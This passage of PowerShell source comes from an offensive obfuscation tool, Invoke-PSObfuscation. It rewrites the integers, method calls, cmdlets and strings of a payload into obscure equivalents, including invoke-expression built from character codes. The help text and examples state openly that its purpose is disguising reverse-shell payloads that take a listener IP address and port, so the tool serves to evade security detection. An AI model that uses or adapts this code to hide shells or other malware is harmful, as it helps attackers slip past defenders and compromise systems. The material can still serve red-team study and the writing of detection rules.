        $Occurrences = (($Payload | Select-String '(?:\d{1,3}\.){3}\d{1,3}|(?<!\w|\$|%%)(?<!\&)\d+(?!>|%)' -AllMatches)).Matches.Value
    }
    Process {  
        Try {
            # For each occurence, replace it with a beacon value
            $Occurrences | ForEach-Object {
                $Beacon = New-EncodedBeacon -Value $_
                [regex]$Pattern = '(?:\d{1,3}\.){3}\d{1,3}|(?<!\w|\$|%%)(?<!\&)\d+(?!>|%)'
                $Payload = $Pattern.replace($Payload, $Beacon, 1)
                $Count++
            }

            # For each occurence, replace it with an obfuscated value
            (($Payload | Select-String '<obfus(.*?)cate>' -AllMatches)).Matches.Value | ForEach-Object {
                $Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
                $NewValue = Get-ObfuscatedInteger -Integer $Decoded
                $Payload = $Payload.Replace("$_", $NewValue, 1)

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$Decoded >> $NewValue"
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

Function Get-ObfuscatedInteger() {
    <#
    .SYNOPSIS
        Genenerates a new integer variation.
    
    .DESCRIPTION
        Genenerates a new integer variation using a randomly selected algorithm.

    .PARAMETER Integer
        The integer that will be replaced within the given payload.
    
    .EXAMPLE
        PS C:\> Get-ObfuscatedInteger -Integer 'value'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Integer
    )
    Begin {
        $Picker = 1..2 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 {
                $NewValue = Get-OperatorEncapsulation -Value $Integer
            }
            2 {
                $NewValue = $Integer
                (1..(1..10 | Get-Random) | ForEach-Object {
                        # Plus or Minus
                        switch ((1..2 | Get-Random)) {
                            1 { $Operator = '+' }
                            2 { $Operator = '-' }
                        }
                        
                        # Left or Right
                        switch ((1..2 | Get-Random)) {
                            1 { $NewValue = "0$Operator$NewValue" }
                            2 { $NewValue = "$NewValue$Operator0" }
                        }
                    } )
                    
                
                # Ensure we do not create negative values
                if ($NewValue -like "*0-$Integer*" ) {
                    switch ((1..2 | Get-Random)) {
                        1 { $NewValue = '$' + "($NewValue+$Integer+$Integer)" }
                        2 { $NewValue = '$' + "($Integer+$Integer+$NewValue)" }
                    }   
                }
                else {
                    $NewValue = '$' + "($NewValue)"   
                }
            }
        }
    }
    End {
        return $NewValue
    }
}

function Find-Method() {
    <#
    .SYNOPSIS
        Identifies and replaces method invocations.
    
    .DESCRIPTION
        Peforms a regex search for any method invocations within the payload and replaces each instance with a new value.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted
    
    .EXAMPLE
        PS C:\> Find-Method -Payload 'Value1'
    
    .NOTES
        This replaces each instance with a unique value by inserting unique beacon values that get replaced.
    #>
    Param (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Occurrences = (($Payload | Select-String '(?<!\w)\$\w+\.\w+\(\)' -AllMatches)).Matches.Value
    }
    Process {  
        Try {
            # For each occurence, replace it with a beacon value
            $Occurrences | ForEach-Object {
                $Beacon = New-EncodedBeacon -Value ($_ -replace '"')
                [regex]$Pattern = "(?<!<obfu%)(?<!\w)\$\w+\.\w+\(\)(?!%cate>)"
                $Payload = $Pattern.replace($Payload, $Beacon, 1)
            }

            # For each occurence, replace it with an obfuscated value
            (($Payload | Select-String '<obfus(.*?)cate>' -AllMatches)).Matches.Value | ForEach-Object {
                $Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
                $NewValue = Get-ObfuscatedMethod -Method $Decoded
                $Payload = $Payload.Replace("$_", $NewValue, 1)

                # Show Changes
                if ($ShowChanges) {
                    #Write-Host "$Decoded >> $NewValue"
                    Write-Host "$Decoded >> $NewValue"
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

function Get-ObfuscatedMethod() {
    <#
    .SYNOPSIS
        Genenerates a new variation of the derived method.
    
    .DESCRIPTION
        Genenerates a new variation of the derived method variation using a randomly selected algorithm.
    
    .PARAMETER method
        The method that will be replaced within the given payload.

    .EXAMPLE
        PS C:\> Get-ObfuscatedMethod -Method 'value'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Method
    )
    Begin {
        $Picker = 1..2 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 {               
                # Create string array
                $CharArrayString = ($Method.ToCharArray() | ForEach-Object { [int][char]$_ }) -join ","
                $NewValue = $(Get-ObfuscatedCmdlet -Cmdlet 'invoke-expression') + '([string]::join('''', ( (<OBFUSCATED>) |%{ ( [char][int] $_)})) | % {$_})' -replace '<OBFUSCATED>', $CharArrayString
                $NewValue = Get-OperatorEncapsulation -Value $NewValue
            }
            2 {
                $NewValue = Get-OperatorEncapsulation -Value $Method
            }
        }
    }
    end {
        return $NewValue
    }
}

Function Invoke-PSObfuscation() {
    <#
    .SYNOPSIS
        Transforms PowerShell scripts into something obscure, unclear, or unintelligible.
    
    .DESCRIPTION
        Where most obfuscation tools tend to add layers to encapsulate standing code, such as base64 or compression, 
        they tend to leave the intended payload intact, which essentially introduces chokepoints. Invoke-PSObfuscation 
        focuses on replacing the existing components of your code, or layer 0, with alternative values. 
    
    .PARAMETER Path
        A user provided PowerShell payload via a flat file.
    
    .PARAMETER IPAddress
        The user provided IP address for the reverse shell listener.

    .PARAMETER Port
        The user provided port for the reverse shell listener.
    
    .PARAMETER All
        The all switch is used to instruct the function to obfuscate each supported component.
        
    .PARAMETER Aliases
        The aliases switch is used to instruct the function to obfuscate aliases.

    .PARAMETER Cmdlets
        The cmdlets switch is used to instruct the function to obfuscate cmdlets.

    .PARAMETER Listener
        The listener switch is used to instruct the function to obfuscate the listener ip and port.

    .PARAMETER Methods
        The methods switch is used to instruct the function to obfuscate method invocations.

    .PARAMETER NamespaceClasses
        The namespaceclasses switch is used to instruct the function to obfuscate namespace classes.
    
    .PARAMETER Pipes
        The pipes switch is used to instruct the function to obfuscate pipes.

    .PARAMETER PipelineVariables
        The pipeline variables switch is used to instruct the function to obfuscate pipeline variables.

    .PARAMETER ShowChanges
        The ShowChanges switch is used to instruct the script to display the raw and obfuscated values on the screen.

    .PARAMETER Strings
        The strings switch is used to instruct the function to obfuscate prompt strings.
  
    .PARAMETER Variables
        The variables switch is used to instruct the function to obfuscate variables.

    .EXAMPLE
        PS C:\> Invoke-PSObfuscation -Path .\payload.ps1 -IPAddress '192.168.54.197' -Port '443' -All
    
    .EXAMPLE
        PS C:\> Invoke-PSObfuscation -Path .\payload.ps1 -IPAddress '192.168.54.197' -Port '443' -Variables -Cmdlets -OutFile newfile.ps1
    
    .OUTPUTS
        System.String, System.String
    
    .NOTES
        Additional information about the function.
    #>
    [CmdletBinding()]
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Path,
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Port,
        [Parameter(Mandatory = $true, Position = 1)]
        [System.String]$IPAddress,
        [Parameter(Mandatory = $false, Position = 2)]
        [System.String]$Outfile = (Join-Path -Path $(Get-Location) -ChildPath 'obfuscated.ps1'),
        [switch]$All,
        [switch]$Aliases,
        [switch]$Cmdlets,
        [switch]$Methods,
        [switch]$Integers,
        [switch]$Listener,
        [switch]$NamespaceClasses,
        [switch]$ShowChanges,
        [switch]$Pipes,
        [switch]$PipelineVariables,
        [switch]$Strings,
        [switch]$Variables
    )
    Begin {
        Write-Output ''
        Write-Output '     >> Layer 0 Obfuscation'
        Write-Output '     >> https://github.com/gh0x0st'
        Write-Output ''

        $Content = [System.IO.File]::ReadAllLines( ( Resolve-Path $Path )) 

    }
    Process {
        # Check if we are using at least one parameter
        if (!($All -or $Aliases -or $Methods -or $Strings -or $Variables -or $Pipes -or $Cmdlets -or $Integers -or $NamespaceClasses -or $PipelineVariables -or $Listener) ) {
            Write-Output '[!] You must include at least one switch parameter'
            Write-Output ''
            break
        }

        # Always to ensure payload is converted to a single line and output as a string
        Write-Output '[*] Converting into a single line'
        $Obfuscated = ConvertTo-OneLine -Payload $Content

        ## Insert socket ip address and port number beacons to prevent formatting conflicts from other functions
        Write-Output '[*] Inserting socket beacons'
        $Obfuscated = Format-SocketBeacons -Payload $Obfuscated -IPAddress -Port

        # Are we running everything?
        if ($All) {
            $Aliases = $true
            $Cmdlets = $true
            $Integers = $true
            $Listener = $true
            $Methods = $true
            $NamespaceClasses = $true
            $Pipes = $true
            $PipelineVariables = $true
            $Strings = $true
            $Variables = $true
        }

        # Obfuscate the things with the code
        if ($Aliases) {
            Write-Output '[*] Resolving aliases'
            $Obfuscated = Resolve-Aliases -Payload $Obfuscated 
        } 

        if ($Strings) {
            Write-Output '[*] Obfuscating strings'
            $Obfuscated = Find-String -Payload $Obfuscated
        }

        if ($NamespaceClasses) {
            Write-Output "[*] Obfuscating namespace classes"
            $Obfuscated = Find-NameSpace -Payload $Obfuscated
        }

        if ($Cmdlets) {
            Write-Output "[*] Obfuscating cmdlets"
            $Obfuscated = Find-Cmdlet -Payload $Obfuscated
        }

        if ($Pipes) {
            Write-Output "[*] Obfuscating pipes"
            $Obfuscated = Find-Pipe -Payload $Obfuscated
        }

        if ($PipelineVariables) {
            Write-Output "[*] Obfuscating pipeline variables"
            $Obfuscated = Find-PipelineVariable -Payload $Obfuscated
        }

        if ($Variables) {
            Write-Output "[*] Obfuscating variables"
            $Obfuscated = Find-Variable -Payload $Obfuscated
        }

        if ($Methods) {
            Write-Output '[*] Obfuscating method invocations'
            $Obfuscated = Find-Method -Payload $Obfuscated
        }

        if ($Integers) {
            Write-Output "[*] Obfuscating integers"
            $Obfuscated = Find-Integer -Payload $Obfuscated
        }

        if ($Listener) {
            Write-Output '[*] Obfuscating socket listener ip and port'
            $Obfuscated = Find-Listener -Payload $Obfuscated -Port $Port -IPAddress $IPAddress 
        }
        else {
            Write-Output '[*] Restoring socket listener ip and port without obfuscation'
            $Obfuscated = Find-Listener -Payload $Obfuscated -Port $Port -IPAddress $IPAddress -Plain
        }
    }
    End {
        $Obfuscated | Out-File $Outfile
        Write-Output "[*] Writing payload to $Outfile"
        Write-Output '[*] Done'
        Write-Output ""
    }
}
